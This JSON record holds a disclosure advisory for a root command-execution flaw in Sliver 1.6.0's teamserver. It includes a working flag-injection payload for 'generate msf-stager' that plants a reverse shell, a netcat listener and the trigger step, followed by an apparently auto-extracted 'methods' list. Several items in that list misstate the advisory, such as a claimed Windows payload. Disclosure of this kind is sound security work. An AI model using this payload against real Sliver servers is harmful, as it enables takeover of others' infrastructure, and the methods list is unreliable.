{"description": "## Description\n\nSliver version 1.6.0 (prerelease) is vulnerable to RCE on the teamserver by a low-privileged \"operator\" user. The RCE is as the system root user.\n\n## Impact\nAs described in a [past issue](https://github.com/BishopFox/sliver/issues/65), \"there is a clear security boundary between the operator and server, an operator should not inherently be able to run commands or code on the server.\" An operator who exploited this vulnerability would be able to view all console logs, kick all other operators, view and modify files stored on the server, and ultimately delete the server.\n\n## Reproduction\n\nFirst configure the Sliver server [in multiplayer mode and add an operator profile](https://sliver.sh/docs?name=Multi-player+Mode).\n\nNext, compile a slightly older version of the Sliver client. The commit after 5016fb8d updates the Cobra command-line parsing library in the Sliver client to strictly validate command flags.\n\n```\ngit checkout 5016fb8d\nVERSION=1.6.0 make client\n```\n\nThe latest server version is targeted:\n\n```\nAll hackers gain exalted\n[*] Server v1.6.0 - bdfd89167dd47aece2397c638d482f94f3f91cba\n[*] Client 1.6.0 - 5016fb8d7cdff38c79e22e8293e58300f8d3bd57\n[*] Welcome to the sliver shell, please type 'help' for options`\n```\n\nThe exploit uses a command injection in the `generate msf-stager` to inject the `--out` flag to `msfvenom`. We overwrite Sliver's own go binary at `/root/.sliver/go/bin/go`:\n\n```\nsliver > generate msf-stager --lhost 192.168.0.128 --lport 8888 --advanced --platform=linux&--payload=linux/x64/shell_reverse_tcp&--format=elf&--out=/root/.sliver/go/bin/go\n\n[*] Sliver implant stager saved to: [...]\n```\n\nThe other injected flags are to force a Linux payload, and not necessary if running the Sliver server on Windows.\n\nIf you check the saved implant locally on the client, it's 0 bytes as the output got written to the file on the server instead.\n\nOn the attacking machine, setup a netcat shell:\n\n```\n$ nc -lvp 8888\nListening on 0.0.0.0 8888\n```\n\nTrigger the stager by running a command which executes `/root/.sliver/go/bin/go`:\n\n```\nsliver > generate beacon --mtls 1.2.3.4\n[*] Generating new windows/amd64 beacon implant binary (1m0s)\n[*] Symbol obfuscation is enabled\n \u283c  Compiling, please wait ...\n```\n\nA root shell will pop:\n\n```\n$ nc -lvp 8888\nListening on 0.0.0.0 8888\nConnection received on 192.168.0.183 39238\nwhoami\nroot\n```\n\nThe vulnerable code was introduced in https://github.com/BishopFox/sliver/pull/1281\n", "methods": ["Used command injection in the `generate msf-stager` to inject the `--out` flag to `msfvenom`.", "Executed a command which executes `/root/.sliver/go/bin/go` to trigger the stager.", "Used a netcat shell to receive a reverse shell.", "Used a Linux payload to execute a reverse shell.", "Used a Windows payload to execute a reverse shell.", "Used a beacon implant binary to execute a reverse shell.", "Used a root shell to execute arbitrary commands.", "Used a compromised Sliver server to view console logs, kick operators, view and modify files, and delete the server."]}
